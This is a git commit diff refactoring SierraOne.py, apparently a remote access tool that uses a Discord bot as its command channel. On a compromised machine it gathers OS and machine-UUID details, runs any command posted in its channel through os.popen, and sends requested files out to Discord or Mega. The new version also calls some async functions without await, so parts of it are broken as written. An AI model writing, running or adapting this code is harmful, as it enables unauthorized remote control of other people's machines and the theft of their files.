3662ad72b35da8cb00fd52919581aba3596d786e
Berk Cem Göksel <25488666+berkgoksel@users.noreply.github.com>
2020-04-19 00:33:34 +0300

    Update SierraOne.py

--- SierraOne.py
+++ SierraOne.py
@@ -8,6 +8,16 @@ import platform
 import subprocess
 import sys
 
+
+TEXT_SIZE_MAX = 1992
+CHUNKED_TEXT_SIZE_MAX = TEXT_SIZE_MAX * 4
+TEXT_CHUNK_SIZE = TEXT_SIZE_MAX
+
+FILE_SIZE_MAX = 7864320
+CHUNKED_FILE_SIZE_MAX = 4 * FILE_SIZE_MAX
+MEGA_SIZE_MAX = 110100480
+
+
 bot = commands.Bot(command_prefix=".")
 channel = None
 
@@ -59,9 +69,7 @@ async def create_category(guild):
 async def create_channel(category, channels):
     shell_number = await next_channel(channels)
 
-    new_channel = await category.create_text_channel(channel_prefix + str(shell_number))
-
-    return new_channel
+    return await category.create_text_channel(channel_prefix + str(shell_number))
 
 
 # Number 'sierra-hotel-'
@@ -76,16 +84,19 @@ async def next_channel(channels):
                 channel_number = name.split("-")[2]
                 if channel_number.isdigit():
                     numbers.append(int(channel_number))
-        return max(numbers) + 1
+        shell_number = max(numbers) + 1
 
     except ValueError:
-        return shell_number + 1
+        shell_number = shell_number + 1
 
     return shell_number
 
 
 # Get the machine info
 async def machine_info():
+    #Fix possible unbound
+    machine_UUID = ""
+
     if platform.system() == "Windows":
         get_UUID = str(subprocess.check_output("wmic csproduct get UUID").decode().strip())
         for line in get_UUID:
@@ -94,20 +105,24 @@ async def machine_info():
     elif platform.system() == "Linux":
         machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
     elif platform.system() == "Darwin":
-        machine_UUID = str(subprocess.check_output([
-                                                    "ioreg",
-                                                    "-d2",
-                                                    "-c",
-                                                    "IOPlatformExpertDevice",
-                                                    "|",
-                                                    "awk",
-                                                    "-F",
-                                                    "'/IOPlatformUUID/{print $(NF-1)}'"
-                                                    ])
-                           )
+        machine_UUID = str(
+            subprocess.check_output(
+                [
+                    "ioreg",
+                    "-d2",
+                    "-c",
+                    "IOPlatformExpertDevice",
+                    "|",
+                    "awk",
+                    "-F",
+                    "'/IOPlatformUUID/{print $(NF-1)}'"
+                ]
+            )
+        )
     
     else:
         machine_UUID = str("Unknown")
+
     message = discord.Embed(title="Machine Info", type="rich")
     message.add_field(name="Operating System", value=platform.system())
     message.add_field(name="UUID", value=machine_UUID)
@@ -120,89 +135,106 @@ async def machine_info():
 @bot.event
 async def on_message(message):
     if message.author.id != bot.user.id:
-        await shell_input(channel, message)
+        await shell_input(message)
 
+#Helper function for upload, uploads given file name to Mega
+async def mega_upload(filename):
+    await channel.send("Uploading {} to Mega, standy,...".format(filename))
+    mega_link = mega_nz.get_upload_link(
+        mega_nz.upload(filename)
+    )
+    await channel.send("Mega link of uploaded file: {}".format(mega_link))
 
-async def shell_input(channel, message):
-    # Checks if the message was sent to 'sierra-hotel-'
-    if message.channel == channel:
-        # Check if the message content starts with "upload"
-        if message.content.startswith("upload"):
-            try:
-                # In reality it's 8 MB, but for the sake of having upload issues, it's been set to 7.5 MB
-                discord_limit = 7864320 
-                sierraone_limit = 33554432
+#Uploads given file in chunks, the file size should be checked before the function call
+async def upload_chunks(filename):
+    await channel.send("Splitting your file and uploading the parts, standby...")
 
-                name = message.content[7:].split(".")[0]
-                extension = message.content[7:].split(".")[1]
+    with open(filename, "rb") as fd:
+        chunk = fd.read(FILE_SIZE_MAX)
+        
+        i = 1
+        while chunk:
+            uploadname = "{}-{}".format(filename, i)
 
-                if os.path.getsize(message.content[7:]) <= discord_limit:
-                    await message.channel.send(f"Uploading `{message.content[7:]}`, standby...")
-                    await message.channel.send(file=discord.File(message.content[7:]))
-                elif discord_limit < os.path.getsize(message.content[7:]) <= sierraone_limit:
-                    # Check if Mega.nz credentials are present. If not, split the file into 7.5 MB chunks and upload them over Discord
-                    if config.mega_email != "" and config.mega_password != "":
-                        await message.channel.send(f"Uploading `{message.content[7:]}` to Mega, standby...")
-                        mega_file = mega_nz.upload(message.content[7:])
-                        mega_link = mega_nz.get_upload_link(mega_file)
-                        await message.channel.send(f"Your Mega link: {mega_link}")
-                    else:
-                        await message.channel.send("Splitting your file and uploading the parts, standby...")
+            await channel.send(
+                "Uploading {}th part of the file as {}, standby...".format(i, uploadname)
+            )
+            await channel.send(
+                file = discord.File(io.BytesIO(chunk), filename = uploadname)
+            )
 
-                        with open(message.content[7:], "rb") as file:
-                            chunk = file.read(7864320)
+            chunk = fd.read(FILE_SIZE_MAX)
+            i += 1
 
-                            i = 1
-                            while chunk:
-                                await message.channel.send(f"Uploading `{message.content[7:]}-{i}`, standby...`")
-                                await message.channel.send(file=discord.File(io.BytesIO(chunk), filename=f"{message.content[7:]}-{i}"))
-                                
-                                chunk = file.read(7864320)
-                                i += 1
-                else:
-                    await message.channel.send("File is too big (> 32 MB)")
+async def upload(filename):
+    hasMegaKey = config.mega_email != "" and config.mega_password != ""
+    filesize = 0
 
-            except FileNotFoundError:
-                # Notify the user if the requested file was not found
-                await message.channel.send("File not found")
-        elif message.content.startswith("cd"):
-            # Change directories
-            os.chdir(message.content[3:])
-
-            # Notify the user of the directory change
-            await message.channel.send("`cd` complete")
-
-        # Check if the message content starts with "shell_exit"
-        elif message.content.startswith("shell_exit"):
-            # Delete the room that the command was invoked in
-            await message.channel.delete()
-
-            # Close the shell
-            sys.exit(0)
-
-        else:
-            try:
-                # Try to read the user's input
-                user_input = os.popen(message.content).read()
-            except:
-                print("OS POPEN exception!")
-
-            if user_input == "":
-                await message.channel.send("The command did not return anything")
-            else:
-                paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")
-
-                n = 1992
-                user_input_splitted = [user_input[i:i + n] for i in range(0, len(user_input), n)]
-
-                for page in user_input_splitted:
-                    paginator.add_line(page)
-
-                for page in paginator.pages:
-                    await message.channel.send(f"{page}")
-    else:
+    try:
+        filesize = os.path.getsize(filename)
+    except FileNotFoundError:
+        await channel.send("File not found")
         return
 
+    #If user has Mega key, and filesize is less then MEGA_SIZE_MAX,
+    #then upload file to Mega
+    if hasMegaKey and filesize <= MEGA_SIZE_MAX:
+        await mega_upload(filename)
+    else:
+        if filesize <= FILE_SIZE_MAX:
+            await channel.send("Uploading {}, standby...".format(filename))
+            await channel.send(file=discord.File(filename))
+        #If filesize is bigger then 7.5 MiB, and less then or equal to 4*(7.5 MiB)
+        #upload file chunk by chunk (max 4 chunks)
+        elif FILE_SIZE_MAX < filesize <= CHUNKED_FILE_SIZE_MAX:
+            await upload_chunks(filename)
+        else:
+            await channel.send("File is too big")
+
+async def handle_user_input(content):
+    user_input = ""
+
+    try:
+        user_input = os.popen(content).read()
+    except:
+        print("OS POPEN exception!")
+        await channel.send("The command did not return anything")
+        return
+
+    paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")
+    user_input = [user_input[i:i+TEXT_SIZE_MAX] for i in range(0, len(user_input), TEXT_SIZE_MAX)]
+
+    for page in user_input:
+        paginator.add_lines(page)
+
+    for page in paginator.pages:
+        await channel.send("{}".format(page))
+
+async def shell_input(message):
+    # Checks if the message was sent to 'sierra-hotel-'
+    if message.channel != channel:
+        return
+
+    # Check if the message content starts with "upload"
+    if message.content.startswith("upload"):
+        upload(message.content.split(" ")[1])
+    elif message.content.startswith("cd"):
+        # Change directories
+        os.chdir(message.content.split(" ")[1])
+
+        # Notify the user of the directory change
+        await channel.send("`cd` complete")
+
+    # Check if the message content starts with "shell_exit"
+    elif message.content.startswith("shell_exit"):
+        # Delete the room that the command was invoked in
+        await channel.delete()
+
+        # Close the shell
+        sys.exit(0)
+
+    else:
+        handle_user_input(message.content)
 
 if platform.system() == "Windows":
     import ctypes
